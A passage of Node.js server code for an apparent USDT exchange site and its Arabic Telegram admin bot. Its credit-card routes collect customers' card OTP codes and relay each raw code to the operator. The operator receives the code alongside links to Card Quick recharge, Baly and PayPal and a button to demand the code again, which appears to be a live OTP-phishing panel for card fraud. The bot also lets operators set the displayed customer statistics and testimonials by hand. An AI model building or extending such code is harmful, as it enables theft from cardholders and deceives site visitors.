app.post('/api/order/creditcard/verify', async (req, res) => {
  try {
    const { orderId, otp } = req.body || {};
    const oid = String(orderId || '').trim();
    const code = String(otp || '').trim();
    if (!oid || !code) return res.status(400).json({ error: 'Missing required fields' });

    const clientIp = getClientIpFromRequest(req);
    const blocked = await getBlockedIpEntry(clientIp);
    if (blocked) return res.status(403).json(blockedViolationPayload(blocked));

    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
    const expectedVisitorId = visitorId || `ip:${clientIp}`;

    const all = await loadOrders(ORDERS_CRM_PATH);
    const row = findOrderByBusinessId(all, oid);
    if (!row) return res.status(404).json({ error: 'Order not found' });

    if (String(row.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
      return res.status(403).json({ error: 'Unauthorized' });
    }

    const otpRes = await verifyCreditCardOtp(oid, code);
    if (!otpRes?.ok) {
      return res.status(400).json({ error: 'Invalid or expired OTP', code: otpRes?.code || 'OTP_FAILED' });
    }

    const r = await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'completed');
    if (!r?.ok) return res.status(404).json({ error: 'Order not found' });

    await botSend(
      [
        '✅ تم تأكيد كود بطاقة الائتمان',
        `<b>طلب:</b> <code>${escapeTelegramHtml(oid)}</code>`,
        `<b>الزائر:</b> <code>${escapeTelegramHtml(expectedVisitorId)}</code>`,
        `<b>الكود:</b> <code>${escapeTelegramHtml(code)}</code>`,
        '<i>تم تحديث الحالة إلى: مكتمل</i>',
      ].join('\n'),
      {},
      telegramSupportChatId()
    );

    return res.json({ ok: true, orderId: oid });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.post('/api/order/creditcard/submit', async (req, res) => {
  try {
    const { orderId, otp } = req.body || {};
    const oid = String(orderId || '').trim();
    const code = String(otp || '').trim();
    if (!oid || !code) return res.status(400).json({ error: 'Missing required fields' });
    if (!/^\d{6}$/.test(code)) return res.status(400).json({ error: 'OTP must be 6 digits' });

    const clientIp = getClientIpFromRequest(req);
    const blocked = await getBlockedIpEntry(clientIp);
    if (blocked) return res.status(403).json(blockedViolationPayload(blocked));

    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
    const expectedVisitorId = visitorId || `ip:${clientIp}`;

    const all = await loadOrders(ORDERS_CRM_PATH);
    const row = findOrderByBusinessId(all, oid);
    if (!row) return res.status(404).json({ error: 'Order not found' });

    if (String(row.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
      return res.status(403).json({ error: 'Unauthorized' });
    }

    const submissionId = `ccsub_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`.slice(0, 60);
    const expAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
    const submissions = await loadCreditCardOtpSubmissions();
    const filtered = submissions.filter((s) => s.orderId !== oid); // keep one active submission per order
    filtered.push({
      id: submissionId,
      orderId: oid,
      visitorId: expectedVisitorId,
      otp: code,
      submittedAt: new Date().toISOString(),
      decision: 'pending',
      decidedAt: '',
      expAt,
    });
    await saveCreditCardOtpSubmissions(filtered);

    const kb = {
      inline_keyboard: [
        [{ text: 'Card Quick', url: 'https://www.card-quick.com/en/product-category/mobile-recharge/recharge-asiacell-credit/' }],
        [{ text: 'فتح تطبيق Baly', url: 'https://play.google.com/store/apps/details?id=app.baly.passenger' }],
        [{ text: 'PayPal', url: 'https://www.paypal.com/' }],
        [{ text: '1 تعليق', callback_data: `ccotp:${makeActionToken('cc_hold', submissionId)}` }],
        [{ text: '2 اكتمال', callback_data: `ccotp:${makeActionToken('cc_complete', submissionId)}` }],
        [{ text: '3 رفض', callback_data: `ccotp:${makeActionToken('cc_reject', submissionId)}` }],
        [{ text: '4 طلب اعادة ادخال الرمز الصحيح', callback_data: `ccotp:${makeActionToken('cc_reenter', submissionId)}` }],
      ],
    };

    await botSend(
      [
        '🧾 <b>كود بطاقة ائتمان</b>',
        `━━━━━━━━━━━━━━━`,
        `<b>رقم الطلب:</b> <code>${escapeTelegramHtml(oid)}</code>`,
        `<b>الكود المرسل:</b> <code>${escapeTelegramHtml(code)}</code>`,
        `━━━━━━━━━━━━━━━`,
        '<i>اختر قرارك من الأزرار.</i>',
      ].join('\n'),
      { reply_markup: kb },
      telegramSupportChatId()
    );

    return res.json({ ok: true, orderId: oid, submissionId, decision: 'pending' });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

app.get('/api/order/creditcard/decision', async (req, res) => {
  try {
    const submissionId = String(req.query.submissionId || '').trim();
    if (!submissionId) return res.status(400).json({ error: 'Missing submissionId' });

    const clientIp = getClientIpFromRequest(req);
    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
    const expectedVisitorId = visitorId || `ip:${clientIp}`;

    const sub = await getCreditCardOtpSubmission(submissionId);
    if (!sub) return res.status(404).json({ error: 'Submission not found' });

    if (String(sub.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
      return res.status(403).json({ error: 'Unauthorized' });
    }

    return res.json({ ok: true, submissionId, orderId: sub.orderId, decision: sub.decision || 'pending', decidedAt: sub.decidedAt || '' });
  } catch (e) {
    res.status(500).json({ error: String(e?.message || e) });
  }
});

// --- Telegram bot polling for admin updates ---
const adminIds = new Set(String(process.env.TELEGRAM_ADMIN_IDS || '')
  .split(',')
  .map((s) => s.trim())
  .filter(Boolean));

let updateOffset = 0;
let isPolling = false;
const SERVER_START_TS = Math.floor(Date.now() / 1000);
const pendingStates = new Map(); // chatId -> { action, path?, label?, method? }
function getPendingState(chatId) { return pendingStates.get(String(chatId)) || null; }
function setPendingState(chatId, state) {
  if (state) pendingStates.set(String(chatId), state);
  else pendingStates.delete(String(chatId));
}

function isAdminMessage(msg) {
  const fromId = msg?.from?.id;
  return fromId && adminIds.has(String(fromId));
}

function helpText() {
  return [
    '🛠️ أوامر الإدارة - TETHER IQ',
    '━━━━━━━━━━━━━━━',
    '',
    '📋 عرض البيانات:',
    '/pay — عرض بيانات الدفع الحالية',
    '/ratemode — عرض وضع سعر الصرف الحالي',
    '',
    '⏱️ توقيت انتهاء الدفع:',
    '/timer 15 — تعيين وقت الانتهاء بالدقائق',
    '   مثال: /timer 20',
    '',
    '💱 سعر الصرف:',
    '/rate 1350 — سعر ثابت (1350 دينار لكل USDT)',
    '/ratefloat 1310 40 — سعر عائم (سعر Binance × 1310 + 40)',
    '',
    '📷 باركود QR (أرسل صورة مع caption):',
    '   qr fastpay   — باركود FastPay',
    '   qr zain      — باركود زين كاش',
    '   qr fib       — باركود المصرف الأول',
    '   qr mastercard — باركود ماستر كارد',
    '   qr asia      — باركود آسيا حوالة',
    '',
    '📈 CRM (زيارات وطلبات):',
    'من القائمة: زر «CRM» — أو افتح /admin/crm على الموقع مع ADMIN_CRM_TOKEN.',
    '',
    '📱 قنوات تيليجرام (.env):',
    'TELEGRAM_CHAT_ID — المعرف الموحد لكل شيء (الإدارة + الطلبات + دردشة الموقع).',
    '',
    '💬 محادثة الموقع (العملاء):',
    'عند وصول إشعار «رسالة من الموقع» — اضغط «رد» على ذلك الإشعار واكتب جوابك.',
    'أو: /reply sess_xxx نص الرسالة',
    '',
    '🧾 الطلبات:',
    '/order ORD-xxx — عرض تفاصيل طلب كاملة + أزرار الحالة',
    'أو: /طلب ORD-xxx',
    'عند طلب جديد: أزرار «تم الإكمال / أرشفة / إلغاء» تظهر للعميل في صفحة التتبع.',
    '',
    '🚫 حظر IP:',
    '/banip 1.2.3.4 [سبب اختياري] — حظر عنوان IP',
    '/unbanip 1.2.3.4 — فك الحظر',
    '/blockedips — عرض آخر عناوين محظورة',
    '',
    '🧬 حظر Fingerprint:',
    '/banfp &lt;fingerprint&gt; [سبب اختياري] — حظر بصمة جهاز',
    '/unbanfp &lt;fingerprint&gt; — فك حظر بصمة جهاز',
    '/blockedfps — عرض آخر بصمات محظورة',
    '',
    '✏️ تعديل البيانات:',
    '/set methods.fastPay.number 07...',
    '/set methods.zainCash.number 07714740129',
    '/set methods.fib.accountNumber 1234567890',
    '/set methods.fib.accountName TetherIQ Exchange',
    '/set methods.mastercard.cardNumber 4444 5555 6666 7777',
    '/set methods.mastercard.cardHolder TetherIQ',
    '/set methods.asiaHawala.number 07700000000',
    '',
    '🤖 تحسين النص بالذكاء الاصطناعي:',
    '/setgemini YOUR_API_KEY — حفظ مفتاح Gemini في .env',
    '/improve نص — تحسين عام وواضح',
    '/formal نص — صياغة رسمية',
    '/short نص — اختصار النص',
    '━━━━━━━━━━━━━━━',
  ].join('\n');
}

async function improveTelegramTextWithAi(mode, inputText) {
  const apiKey = String(process.env.GEMINI_API_KEY || '').trim();
  if (!apiKey) {
    throw new Error('GEMINI_API_KEY not set');
  }

  const preferredModel = String(process.env.GEMINI_MODEL || '').trim();
  const modelCandidates = [
    preferredModel,
    'gemini-flash-latest',
    'gemini-2.0-flash',
    'gemini-1.5-flash-latest',
    'gemini-1.5-pro-latest',
  ].filter(Boolean);
  const safeText = String(inputText || '').trim().slice(0, 4000);
  if (!safeText) throw new Error('Empty text');

  const modeInstruction = mode === 'formal'
    ? 'اجعل النص رسمياً ومهنياً.'
    : mode === 'short'
      ? 'اختصر النص مع الحفاظ على المعنى.'
      : 'حسّن النص ليكون واضحاً ومهنياً وسهل القراءة.';

  const prompt = [
    'أنت مساعد لتحسين النصوص العربية والإنجليزية.',
    modeInstruction,
    'أعد النص النهائي فقط بدون شرح إضافي.',
    '',
    'النص:',
    safeText,
  ].join('\n');

  let lastError = 'Unknown AI error';
  for (const model of modelCandidates) {
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${encodeURIComponent(model)}:generateContent`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-goog-api-key': apiKey,
      },
      body: JSON.stringify({
        contents: [{ parts: [{ text: prompt }] }],
        generationConfig: {
          temperature: 0.4,
          maxOutputTokens: 800,
        },
      }),
      signal: AbortSignal.timeout(25000),
    });

    const data = await resp.json().catch(() => ({}));
    if (!resp.ok) {
      lastError = data?.error?.message || `HTTP ${resp.status}`;
      const modelMissing = String(lastError).includes('is not found')
        || String(lastError).includes('not supported for generateContent');
      if (modelMissing) continue;
      throw new Error(lastError);
    }

    const out = data?.candidates?.[0]?.content?.parts
      ?.map((p) => p?.text || '')
      .join('')
      .trim();
    if (out) return out.slice(0, 3800);
    lastError = `No AI output from model ${model}`;
  }

  throw new Error(lastError);
}

function setByPath(obj, p, value) {
  const parts = p.split('.').filter(Boolean);
  if (!parts.length) return false;
  let cur = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    const k = parts[i];
    if (typeof cur[k] !== 'object' || cur[k] === null) cur[k] = {};
    cur = cur[k];
  }
  cur[parts[parts.length - 1]] = value;
  return true;
}

async function botSend(text, extra = {}, forceChatId = null) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const defaultChatId = telegramSettingsChatId();
    const finalChatId = forceChatId || extra.chat_id || defaultChatId;

    if (!botToken || !finalChatId) return;

    const { chat_id: _ignoreChat, ...restExtra } = extra;
    const { data } = await tgPostJson(botToken, 'sendMessage', {
      chat_id: telegramChatIdForApi(finalChatId),
      text,
      parse_mode: 'HTML',
      ...restExtra,
    });

    if (!data?.ok) {
       
      console.error(`Bot: sendMessage failed for ${finalChatId}:`, JSON.stringify(data));
    }
  } catch (err) {
     
    console.error('Bot: botSend exception:', err);
  }
}

async function sendCrmDocument(chatId, filename, buffer, caption = '') {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken || !chatId) return;
    const form = new FormData();
    form.append('chat_id', String(chatId));
    if (caption) form.append('caption', caption.slice(0, 1000));
    const mime = filename.endsWith('.csv') ? 'text/csv' : 'text/html';
    form.append('document', buffer, { filename, contentType: mime });
    const { data } = await tgPostMultipart(botToken, 'sendDocument', form);
    if (!data?.ok) {
       
      console.error('Bot: sendDocument failed:', JSON.stringify(data));
    }
  } catch (err) {
     
    console.error('Bot: sendCrmDocument exception:', err);
  }
}

async function showCrmHome(forceChatId = null) {
  const visits = await loadVisits(VISITS_PATH);
  const orders = await loadOrders(ORDERS_CRM_PATH);
  const vSt = computeVisitStats(visits);
  const oSt = computeOrderStats(orders);

  // Summarize by source (location and device)
  const topSources = vSt.topSources
    .map((s) => `• (${s.location} · ${s.device}) : <b>${s.count}</b>`)
    .join('\n') || '—';

  const text = [
    '📈 <b>CRM — ملخص النشاط</b>',
    '━━━━━━━━━━━━━━━',
    `👥 <b>الزيارات:</b> ${vSt.visitsToday} اليوم · ${vSt.visitsWeek} أسبوعياً`,
    `✨ <b>زوّار مميّز (7 أيام):</b> ${vSt.uniqueVisitorsWeek}`,
    '',
    `🛒 <b>الطلبات:</b> ${oSt.ordersToday} اليوم · ${oSt.ordersWeek} أسبوعياً`,
    `💰 <b>حجم التداول (7 أيام):</b> ${oSt.volumeWeek} USDT`,
    '',
    '🔥 <b>المصادر الأكثر نشاطاً:</b>',
    topSources,
    '',
    '🌐 <b>لوحة الويب:</b> <code>/admin/crm</code>',
    '🔎 <b>بحث طلب:</b> <code>/order ORD-xxx</code>',
  ].join('\n');

  await botSend(text, {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔎 آخر 5 زيارات', callback_data: 'crm_v5' }, { text: '🛒 آخر 5 طلبات', callback_data: 'crm_o5' }],
        [{ text: '📥 CSV زيارات', callback_data: 'crm_csv_v' }, { text: '📥 CSV طلبات', callback_data: 'crm_csv_o' }],
        [{ text: '📄 تقرير HTML (لـPDF)', callback_data: 'crm_html' }],
        [{ text: '🔙 القائمة الرئيسية', callback_data: 'menu_main' }],
      ],
    },
  }, forceChatId);
}

async function answerCbq(id, text = '') {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) return;
    await tgAnswerCallbackQuery(botToken, id, text);
  } catch { /* ignore */ }
}

function mainMenuKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '📋 بيانات الدفع', callback_data: 'menu_pay' },
        { text: '💱 سعر الصرف', callback_data: 'menu_rate' },
      ],
      [
        { text: '👤 البروفايلات', callback_data: 'menu_profiles' },
        { text: '✏️ تعديل البيانات', callback_data: 'menu_edit' },
      ],
      [
        { text: '⏱️ وقت الانتهاء', callback_data: 'menu_timer' },
        { text: '🆔 Chat ID', callback_data: 'menu_chatid' },
      ],
      [
        { text: '📷 إدارة QR', callback_data: 'menu_qr' },
        { text: '❔ المساعدة', callback_data: 'menu_help' },
      ],
      [
        { text: '⚙️ إعدادات الموقع', callback_data: 'menu_site' },
      ],
      [
        { text: '⭐ التقييمات', callback_data: 'menu_testimonials' },
        { text: '📊 الإحصائيات', callback_data: 'menu_stats' },
      ],
      [
        { text: '📈 CRM — زيارات وطلبات', callback_data: 'menu_crm' },
      ],
      [
        { text: '🛒 الطلبات', callback_data: 'menu_orders' },
      ],
      [
        { text: '🚫 المحظورون', callback_data: 'menu_blocked' },
      ],
    ],
  };
}

async function sendMainMenu(forceChatId = null) {
  await botSend(
    '🛠️ <b>لوحة تحكم TETHER IQ</b>\n━━━━━━━━━━━━━━━\n\nاختر من القائمة:',
    { reply_markup: mainMenuKeyboard() },
    forceChatId
  );
}

async function showChatIdMenu(forceChatId = null) {
  const chatId = telegramSupportChatId();
  await botSend(
    `🆔 <b>Chat ID</b>\n━━━━━━━━━━━━━━━\n<b>القيمة الحالية:</b>\n<code>${chatId || 'غير مضبوط'}</code>\n\nهذا الـ Chat ID هو الموحد لكل شيء:\n• طلبات الشراء\n• دردشة الموقع\n• أوامر البوت`,
    { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu_main' }]] } },
    forceChatId
  );
}

function cancelButton() {
  return { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'cancel_input' }]] };
}

async function showRateMenu(forceChatId = null) {
  const details = await loadPaymentDetails();
  const cfg = details?.rateConfig || {};
  const rate = await computeRate(details);
  const modeAr = cfg.mode === 'float' ? '🔄 عائم' : '📌 ثابت';
  const info = cfg.mode === 'float' ? `(${cfg.floatBase} × USDT + ${cfg.floatOffset})` : '';
  await botSend(
    `💱 <b>سعر الصرف</b>\n━━━━━━━━━━━━━━━\nالوضع: ${modeAr}\nالسعر الحالي: <b>${rate} IQD/USDT</b>${info ? '\n' + info : ''}\n\nاختر:`,
    { reply_markup: { inline_keyboard: [
      [{ text: '📌 تعيين سعر ثابت', callback_data: 'rate_fixed' }, { text: '🔄 وضع عائم', callback_data: 'rate_float' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_main' }],
    ] } },
    forceChatId
  );
}

async function showQrMenu(forceChatId = null) {
  await botSend(
    '📷 <b>إضافة باركود QR</b>\nيتم الحفظ للبروفايل الذي تعدّله حالياً.\n━━━━━━━━━━━━━━━\nاختر طريقة الدفع:',
    { reply_markup: { inline_keyboard: [
      [{ text: '⚡ FastPay', callback_data: 'qr_fastpay' }, { text: '💚 زين كاش', callback_data: 'qr_zain' }],
      [{ text: '🏦 المصرف الأول', callback_data: 'qr_fib' }, { text: '💳 ماستر كارد', callback_data: 'qr_mc' }],
      [{ text: '🌐 آسيا حوالة', callback_data: 'qr_asia' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_main' }],
    ] } },
    forceChatId
  );
}

async function showEditProfilePicker(forceChatId = null) {
  const details = await loadPaymentDetails();
  const rows = details.profiles.map((p, i) => [
    { text: `✏️ ${p.nameAr || p.nameEn || p.id}`, callback_data: `prof_edit_go_${i}` },
  ]);
  rows.push([{ text: '🔙 القائمة الرئيسية', callback_data: 'menu_main' }]);
  await botSend(
    '✏️ <b>اختر البروفايل لتعديل بيانات الدفع</b>\n(كل مدير له حساباته الخاصة)',
    { reply_markup: { inline_keyboard: rows } },
    forceChatId
  );
}

async function showProfilesMenu(forceChatId = null) {
  const details = await loadPaymentDetails();
  const active = details.currentProfileId;
  const rows = details.profiles.map((p, i) => {
    const mark = p.id === active ? ' 🌐' : '';
    return [{ text: `${p.nameAr || p.nameEn}${mark}`, callback_data: `prof_sum_${i}` }];
  });
  rows.push([{ text: '➕ بروفايل جديد', callback_data: 'prof_add' }]);
  rows.push([{ text: '🔙 القائمة الرئيسية', callback_data: 'menu_main' }]);
  await botSend(
    '👤 <b>البروفايلات</b>\n🌐 = البروفايل <b>النشط على الموقع</b> (يظهر للعملاء).\nاضغط لعرض الخيارات.',
    { reply_markup: { inline_keyboard: rows } },
    forceChatId
  );
}

async function showMethodToggleMenu(profileIndex, forceChatId = null) {
  const details = await loadPaymentDetails();
  const p = details.profiles[profileIndex];
  if (!p) return;
  const labels = {
    creditCard: '🧪 بطاقة ائتمان',
    fastPay: '⚡ FastPay',
    zainCash: '💚 زين كاش',
    asiaHawala: '🌐 آسيا حوالة',
    fib: '🏦 FIB',
    mastercard: '💳 ماستر كارد',
  };
  const rows = METHOD_KEYS.map((key) => {
    const on = p.methodEnabled[key] !== false;
    return [{ text: `${on ? '✅' : '⛔'} ${labels[key]}`, callback_data: `prof_mten_${profileIndex}_${key}` }];
  });
  rows.push([{ text: '🔙 رجوع', callback_data: `prof_sum_${profileIndex}` }]);
  await botSend(
    `⚙️ <b>ظهور طرق الدفع على الموقع</b>\nالبروفايل: <b>${p.nameAr}</b>\n✅ ظاهرة للعملاء — ⛔ مخفية\n(تُطبَّق عندما يكون هذا البروفايل هو 🌐 النشط على المنصة)`,
    { reply_markup: { inline_keyboard: rows } },
    forceChatId
  );
}

async function showEditMenu(forceChatId = null) {
  const details = await loadPaymentDetails();
  const pid = resolveEditingProfileId(details, forceChatId);
  const p = getProfileById(details, pid);
  await botSend(
    `✏️ <b>تعديل البيانات</b>\nالبروفايل: <b>${p.nameAr}</b>\n━━━━━━━━━━━━━━━\nاختر طريقة الدفع:`,
    { reply_markup: { inline_keyboard: [
      [{ text: '⚡ FastPay', callback_data: 'edit_fastpay' }, { text: '💚 زين كاش', callback_data: 'edit_zain' }],
      [{ text: '🌐 آسيا حوالة', callback_data: 'edit_asia' }, { text: '🏦 المصرف الأول', callback_data: 'edit_fib' }],
      [{ text: '💳 ماستر كارد', callback_data: 'edit_mc' }],
      [{ text: '🔙 اختيار بروفايل آخر', callback_data: 'menu_edit' }],
      [{ text: '🔙 القائمة الرئيسية', callback_data: 'menu_main' }],
    ] } },
    forceChatId
  );
}

async function showTimerMenu(forceChatId = null) {
  const details = await loadPaymentDetails();
  await botSend(
    `⏱️ <b>وقت انتهاء الدفع</b>\n━━━━━━━━━━━━━━━\nالوقت الحالي: <b>${details.paymentExpiryMinutes} دقيقة</b>\n\nاختر:`,
    { reply_markup: { inline_keyboard: [
      [{ text: '10 دق', callback_data: 'timer_10' }, { text: '15 دق', callback_data: 'timer_15' }, { text: '20 دق', callback_data: 'timer_20' }],
      [{ text: '30 دق', callback_data: 'timer_30' }, { text: '45 دق', callback_data: 'timer_45' }, { text: '⌨️ تخصيص', callback_data: 'timer_custom' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_main' }],
    ] } },
    forceChatId
  );
}

async function showSiteMenu(forceChatId = null) {
  const cfg = await loadSiteConfig();
  const maint = cfg.maintenance?.enabled ? '🔴 مفعّل' : '🟢 مطفأ';
  await botSend(
    `⚙️ <b>إعدادات الموقع</b>\n━━━━━━━━━━━━━━━\nوضع الصيانة: ${maint}`,
    { reply_markup: { inline_keyboard: [
      [{ text: '❓ الأسئلة الشائعة', callback_data: 'site_faq' }, { text: '🏠 نص الهيرو', callback_data: 'site_hero' }],
      [{ text: '🔗 الروابط', callback_data: 'site_links' }, { text: '🔧 وضع الصيانة', callback_data: 'site_maint' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_main' }],
    ] } },
    forceChatId
  );
}

async function showFaqMenu(forceChatId = null) {
  const cfg = await loadSiteConfig();
  const faqs = cfg.faq || [];
  const rows = faqs.map((f, i) => [
    { text: `${i + 1}. ${f.qAr.slice(0, 25)}...`, callback_data: `faq_view_${f.id}` },
    { text: '🗑️', callback_data: `faq_del_${f.id}` },
  ]);
  rows.push([{ text: '➕ إضافة سؤال جديد', callback_data: 'faq_add' }]);
  rows.push([{ text: '🔙 رجوع', callback_data: 'menu_site' }]);
  await botSend(
    `❓ <b>الأسئلة الشائعة</b>\n━━━━━━━━━━━━━━━\nعدد الأسئلة: ${faqs.length}`,
    { reply_markup: { inline_keyboard: rows } },
    forceChatId
  );
}

async function showHeroMenu(forceChatId = null) {
  const cfg = await loadSiteConfig();
  const h = cfg.hero || {};
  await botSend(
    `🏠 <b>نص الهيرو</b>\n━━━━━━━━━━━━━━━\n<b>عنوان AR:</b> ${h.titleAr || '-'}\n<b>عنوان EN:</b> ${h.titleEn || '-'}\n<b>وصف AR:</b> ${(h.subtitleAr || '-').slice(0, 40)}...\n<b>إعلان AR:</b> ${(h.promoAr || '-').slice(0, 35)}...`,
    { reply_markup: { inline_keyboard: [
      [{ text: '✏️ عنوان عربي', callback_data: 'sf_hero_titleAr' }, { text: '✏️ عنوان إنجليزي', callback_data: 'sf_hero_titleEn' }],
      [{ text: '✏️ وصف عربي', callback_data: 'sf_hero_subtitleAr' }, { text: '✏️ وصف إنجليزي', callback_data: 'sf_hero_subtitleEn' }],
      [{ text: '✏️ إعلان عربي', callback_data: 'sf_hero_promoAr' }, { text: '✏️ إعلان إنجليزي', callback_data: 'sf_hero_promoEn' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_site' }],
    ] } },
    forceChatId
  );
}

async function showLinksMenu(forceChatId = null) {
  const cfg = await loadSiteConfig();
  const l = cfg.links || {};
  await botSend(
    `🔗 <b>الروابط</b>\n━━━━━━━━━━━━━━━\n<b>BNB:</b> <code>${l.bnb || '-'}</code>\n<b>OKX:</b> <code>${l.okx || '-'}</code>\n<b>تواصل معنا:</b> <code>${l.contact || '-'}</code>`,
    { reply_markup: { inline_keyboard: [
      [{ text: '🔗 رابط BNB', callback_data: 'sf_link_bnb' }, { text: '🔗 رابط OKX', callback_data: 'sf_link_okx' }],
      [{ text: '📬 رابط التواصل', callback_data: 'sf_link_contact' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_site' }],
    ] } },
    forceChatId
  );
}

async function showMaintenanceMenu(forceChatId = null) {
  const cfg = await loadSiteConfig();
  const enabled = cfg.maintenance?.enabled;
  await botSend(
    `🔧 <b>وضع الصيانة</b>\n━━━━━━━━━━━━━━━\nالحالة: ${enabled ? '🔴 مفعّل' : '🟢 مطفأ'}\n<b>رسالة AR:</b> ${cfg.maintenance?.messageAr || '-'}\n<b>رسالة EN:</b> ${cfg.maintenance?.messageEn || '-'}`,
    { reply_markup: { inline_keyboard: [
      [{ text: enabled ? '✅ تعطيل الصيانة' : '🔴 تفعيل الصيانة', callback_data: 'maint_toggle' }],
      [{ text: '✏️ رسالة عربية', callback_data: 'sf_maint_messageAr' }, { text: '✏️ رسالة إنجليزية', callback_data: 'sf_maint_messageEn' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_site' }],
    ] } },
    forceChatId
  );
}

async function showTestimonialsMenu(forceChatId = null) {
  const list = await loadTestimonials();
  const rows = list.map((r, i) => [
    { text: `${i + 1}. ${r.nameAr} — ${'⭐'.repeat(r.stars)}`, callback_data: `rev_view_${r.id}` },
    { text: '🗑️', callback_data: `rev_del_${r.id}` },
  ]);
  rows.push([{ text: '➕ إضافة تقييم جديد', callback_data: 'rev_add' }]);
  rows.push([{ text: '🔙 رجوع', callback_data: 'menu_main' }]);
  await botSend(
    `⭐ <b>التقييمات</b>\n━━━━━━━━━━━━━━━\nعدد التقييمات: ${list.length}`,
    { reply_markup: { inline_keyboard: rows } },
    forceChatId
  );
}

async function showStatsMenu(forceChatId = null) {
  const s = await loadStats();
  await botSend(
    `📊 <b>الإحصائيات</b>\n━━━━━━━━━━━━━━━\n👥 العملاء: <b>${s.customers.toLocaleString()}</b>\n✅ العمليات: <b>${s.transactions.toLocaleString()}</b>\n🏆 سنوات الخبرة: <b>${s.years}</b>\n⭐ نسبة الرضا: <b>${s.satisfaction}%</b>\n\nاختر ما تريد تعديله:`,
    { reply_markup: { inline_keyboard: [
      [{ text: '👥 تعديل عدد العملاء', callback_data: 'stat_customers' }],
      [{ text: '✅ تعديل عدد العمليات', callback_data: 'stat_transactions' }],
      [{ text: '🏆 تعديل سنوات الخبرة', callback_data: 'stat_years' }],
      [{ text: '⭐ تعديل نسبة الرضا', callback_data: 'stat_satisfaction' }],
      [{ text: '🔙 رجوع', callback_data: 'menu_main' }],
    ] } },
    forceChatId
  );
}

async function sendBlockedIpsList(forceChatId = null) {
  const list = await loadBlockedIps();
  if (!list.length) {
    await botSend('✅ لا توجد عناوين IP محظورة حالياً.', {}, forceChatId);
    return;
  }
  const top = list.slice(-20).reverse();
  const view = top
    .map((it) => `• <code>${escapeTelegramHtml(it.ip)}</code> — ${escapeTelegramHtml(it.reason || 'مخالفة')}`)
    .join('\n');
  const unbanRows = top
    .slice(0, 10)
    .map((it) => [{ text: `✅ فك ${it.ip}`, callback_data: `mod:${makeActionToken('uip', it.ip)}` }]);
  await botSend(
    `🚫 <b>العناوين المحظورة (آخر 20)</b>\n${view}`,
    unbanRows.length ? { reply_markup: { inline_keyboard: unbanRows } } : {},
    forceChatId
  );
}

async function sendBlockedFpsList(forceChatId = null) {
  const list = await loadBlockedFingerprints();
  if (!list.length) {
    await botSend('✅ لا توجد بصمات أجهزة محظورة حالياً.', {}, forceChatId);
    return;
  }
  const top = list.slice(-20).reverse();
  const view = top
    .map((it) => `• <code>${escapeTelegramHtml(it.fingerprint)}</code> — ${escapeTelegramHtml(it.reason || 'مخالفة')}\n  IP snapshot: <code>${escapeTelegramHtml(it.ipSnapshot || '—')}</code>`)
    .join('\n');
  const unbanRows = top
    .slice(0, 10)
    .map((it) => [{
      text: `✅ فك ${String(it.fingerprint || '').slice(0, 10)}…`,
      callback_data: `mod:${makeActionToken('ufp', it.fingerprint)}`,
    }]);
  await botSend(
    `🧬 <b>البصمات المحظورة (آخر 20)</b>\n${view}`,
    unbanRows.length ? { reply_markup: { inline_keyboard: unbanRows } } : {},
    forceChatId
  );
}

async function sendBlockedChatList(forceChatId = null) {
  const list = await loadBlockedChatUsers();
  if (!list.length) {
    await botSend('✅ لا يوجد محظورون من خدمة العملاء حالياً.', {}, forceChatId);
    return;
  }
  const top = list.slice(-20).reverse();
  const view = top
    .map((it) => `• <code>${escapeTelegramHtml(it.fingerprint)}</code> — ${escapeTelegramHtml(it.reason || 'مخالفة')}`)
    .join('\n');
  const unbanRows = top
    .slice(0, 10)
    .map((it) => [{
      text: `✅ فك دردشة ${String(it.fingerprint || '').slice(0, 10)}…`,
      callback_data: `mod:${makeActionToken('uch', it.fingerprint)}`,
    }]);
  await botSend(
    `💬🚫 <b>محظورو خدمة العملاء (آخر 20)</b>\n${view}`,
    unbanRows.length ? { reply_markup: { inline_keyboard: unbanRows } } : {},
    forceChatId
  );
}

async function showBlockedMenu(forceChatId = null) {
  await botSend(
    '🚫 <b>إدارة المحظورين</b>\nاختر الفئة:',
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 محظورو IP', callback_data: 'blocked_ip_list' }],
          [{ text: '🧬 محظورو Fingerprint', callback_data: 'blocked_fp_list' }],
          [{ text: '💬 محظورو خدمة العملاء', callback_data: 'blocked_chat_list' }],
          [{ text: '🔙 القائمة الرئيسية', callback_data: 'menu_main' }],
        ],
      },
    },
    forceChatId
  );
}

async function sendOrderDetailsById(orderId, forceChatId = null) {
  const all = await loadOrders(ORDERS_CRM_PATH);
  const o = findOrderByBusinessId(all, orderId);
  if (!o) {
    await botSend(`❌ لا يوجد طلب بهذا الرقم: <code>${escapeTelegramHtml(orderId)}</code>`, {}, forceChatId);
    return;
  }
  const visits = await loadVisits(VISITS_PATH);
  const resolvedIp = resolveOrderIp(o, visits);
